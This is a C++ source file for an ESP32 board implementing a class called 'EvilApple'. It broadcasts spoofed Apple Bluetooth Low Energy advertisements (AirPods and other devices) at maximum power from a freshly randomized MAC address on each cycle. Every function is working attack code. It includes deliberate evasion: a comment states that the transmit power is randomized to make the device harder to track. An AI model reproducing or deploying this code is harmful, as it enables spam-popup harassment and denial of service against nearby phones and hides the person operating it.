#include "evilApple.h"

const char *Tag = "EvilApple";

void EvilApple::begin()
{
    BLEDevice::init("AirPods 69");
    // Increase the BLE Power to 21dBm (MAX)
    // https://docs.espressif.com/projects/esp-idf/en/stable/esp32c3/api-reference/bluetooth/controller_vhci.html
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    // Create the BLE Server
    BLEServer *pServer = BLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();

    // seems we need to init it with an address in setup() step.
    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void EvilApple::printDsp()
{
    // clear the screen
}

void EvilApple::startAdvertising()
{
    // First generate fake random MAC
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++)
    {
        dummy_addr[i] = random(256);

        // It seems for some reason first 4 bits
        // Need to be high (aka 0b1111), so we
        // OR with 0xF0
        if (i == 0)
        {
            dummy_addr[i] |= 0xF0;
        }
    }

    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    // Randomly pick data from one of the devices
    // First decide short or long
    // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
    int device_choice = random(2);
    if (device_choice == 0)
    {
        int index = random(17);
#ifdef ESP_ARDUINO_VERSION_MAJOR
#if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char *)DEVICES[index], 31));
#else
        oAdvertisementData.addData(std::string((char *)DEVICES[index], 31));
#endif
#endif
    }
    else
    {
        int index = random(13);
#ifdef ESP_ARDUINO_VERSION_MAJOR
#if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char *)SHORT_DEVICES[index], 23));
#else
        oAdvertisementData.addData(std::string((char *)SHORT_DEVICES[index], 23));
#endif
#endif
    }

    int adv_type_choice = random(3);
    if (adv_type_choice == 0)
    {
        pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    }
    else if (adv_type_choice == 1)
    {
        pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    }
    else
    {
        pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }

    // Set the device address, advertisement data
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    // Start advertising
    // Serial.println("Sending Advertisement...");
    ESP_LOGI(Tag, "Sending Advertisement...");
    pAdvertising->start();

    delay(delayMilliseconds); // delay for delayMilliseconds ms
    pAdvertising->stop();

    // Random signal strength increases the difficulty of tracking the signal
    int rand_val = random(100); // Generate a random number between 0 and 99
    if (rand_val < 70)
    { // 70% probability
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    }
    else if (rand_val < 85)
    { // 15% probability
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
    }
    else if (rand_val < 95)
    { // 10% probability
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
    }
    else if (rand_val < 99)
    { // 4% probability
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
    }
    else
    { // 1% probability
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
    }
}

void EvilApple::stopAdvertising()
{
    pAdvertising->stop();
}

EvilApple evilApple;